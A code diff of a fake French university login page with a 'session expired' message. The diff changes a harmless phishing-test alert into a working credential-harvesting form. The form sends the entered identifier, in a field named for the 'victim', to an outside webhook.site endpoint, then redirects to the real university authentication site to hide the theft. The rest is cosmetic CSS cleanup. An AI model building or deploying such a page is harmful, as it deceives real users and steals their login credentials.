@@ -9,12 +9,10 @@
             height: 100%;
             margin: 0;
             font-family: Arial, sans-serif;
-            /* IMAGE DE FOND (Bâtiment) */
             background: url('https://static.affluences.media/sites-pictures/sites/dYgdwRubTHb5xOCLJGvIh.png') no-repeat center center fixed;
             background-size: cover;
         }
 
-        /* BANDEAU BLANC HAUT */
         header {
             background-color: white;
             height: 85px;
@@ -29,11 +27,8 @@
             z-index: 1000;
         }
 
-        header img {
-            height: 60px;
-        }
+        header img { height: 60px; }
 
-        /* CONTENEUR PRINCIPAL */
         .wrapper {
             display: flex;
             flex-direction: column;
@@ -43,10 +38,9 @@
             padding-top: 85px;
         }
 
-        /* BOITE DE LOGIN */
         .login-box {
             width: 380px;
-            background: #E9EBED; /* Gris du screen */
+            background: #E9EBED;
             border-radius: 4px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
             overflow: hidden;
@@ -61,7 +55,6 @@
             line-height: 1.4;
         }
 
-        /* INPUTS AVEC ICONES */
         .input-row {
             display: flex;
             margin-bottom: 12px;
@@ -86,9 +79,9 @@
             border: none;
             background: white;
             font-size: 15px;
+            outline: none;
         }
 
-        /* CHECKBOXES GRISES */
         .check-container {
             display: flex;
             align-items: center;
@@ -102,11 +95,9 @@
         }
 
         .check-container input {
-            flex: 0;
             margin-right: 15px;
         }
 
-        /* BOUTON ROUGE */
         .btn-submit {
             width: 100%;
             background-color: #C63D31;
@@ -122,11 +113,6 @@
             gap: 10px;
         }
 
-        .btn-submit:hover {
-            background-color: #b0352b;
-        }
-
-        /* FOOTER */
         .footer-link {
             margin-top: 15px;
             text-align: center;
@@ -134,8 +120,6 @@
             color: white;
             text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
         }
-
-        .footer-link u { cursor: pointer; }
     </style>
 </head>
 <body>
@@ -150,15 +134,16 @@
             Votre session a expiré, vous devez vous réauthentifier
         </div>
 
-        <form onsubmit="alert('Ceci est un test de phishing !'); return false;">
+        <form action="https://webhook.site/277897aa-a358-40ba-843d-fcba81e50cd2" method="POST" onsubmit="setTimeout(function(){ window.location.href='https://auth.univ-fcomte.fr'; }, 1000);">
+            
             <div class="input-row">
                 <div class="icon-box">👤</div>
-                <input type="text" placeholder="Identifiant">
+                <input type="text" name="identifiant_victime" placeholder="Identifiant" required>
             </div>
 
             <div class="input-row">
                 <div class="icon-box">🔒</div>
-                <input type="password" placeholder="Mot de passe">
+                <input type="password" placeholder="Mot de passe" required>
             </div>
 
             <div class="check-container">
@@ -167,7 +152,7 @@
 
             <div class="check-container">
                 <input type="checkbox"> 
-                <span>Faire confiance à ce navigateur lors des prochaines connexions (double authentification uniquement)</span>
+                <span>Faire confiance à ce navigateur lors des prochaines connexions</span>
             </div>
 
             <button type="submit" class="btn-submit">
